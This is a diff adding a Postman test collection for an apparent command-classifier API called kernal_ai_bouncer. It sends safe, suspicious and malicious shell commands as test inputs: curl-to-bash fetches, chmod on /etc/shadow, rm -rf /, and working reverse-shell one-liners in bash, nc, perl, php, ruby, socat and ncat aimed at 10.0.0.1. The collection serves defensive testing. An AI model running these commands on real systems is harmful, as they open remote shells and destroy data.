@@ -1,0 +1,320 @@
+{
+  "info": {
+    "name": "kernal_ai_bouncer - Extended Tests (20 commands)",
+    "_postman_id": "extended-test-collection",
+    "description": "Lengthy Postman collection with 20 distinct safe, suspicious, and malicious commands for testing.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "Analyze - Safe 1 (echo)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"echo \\\"Running system check\\\"\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Safe 2 (ls)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"ls -la /var/log/nginx\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Safe 3 (cat)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"cat /etc/hostname\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Safe 4 (whoami)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"whoami\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Safe 5 (ps)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"ps -aux | grep python\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 1 (wget)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"wget http://unknown.com/install.sh -O /tmp/install.sh\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 2 (curl bash)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"curl -s http://example.com/payload.sh | bash\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 3 (chmod)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"chmod 777 /etc/shadow\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 4 (chown)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"chown root:root /tmp/pwn\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 5 (eval)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"eval $(cat /tmp/script.sh)\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 6 (python net)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"python3 -c \\\"import urllib.request; urllib.request.urlopen('http://malicious.com')\\\"\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Suspicious 7 (base64)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"base64 -d /tmp/b64 > /tmp/out\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 1 (rm rf)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"rm -rf / --no-preserve-root\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 2 (bash shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 3 (nc shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"nc -e /bin/sh 10.0.0.1 4242\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 4 (perl shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"perl -e 'use Socket;$i=\\\"10.0.0.1\\\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 5 (php shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"php -r '$sock=fsockopen(\\\"10.0.0.1\\\",1234);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 6 (ruby shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"ruby -rsocket -e'f=TCPSocket.open(\\\"10.0.0.1\\\",1234).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 7 (socat shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    },
+    {
+      "name": "Analyze - Malicious 8 (ncat shell)",
+      "request": {
+        "method": "POST",
+        "header": [
+          { "key": "Content-Type", "value": "application/json" }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\n  \"command\": \"ncat 10.0.0.1 4444 -e /bin/bash\"\n}"
+        },
+        "url": "{{API_URL}}/analyze?session_token={{session_token}}"
+      },
+      "response": []
+    }
+  ],
+  "variable": [
+    {
+      "key": "API_URL",
+      "value": "http://localhost:8000"
+    },
+    {
+      "key": "session_token",
+      "value": ""
+    }
+  ]
+}
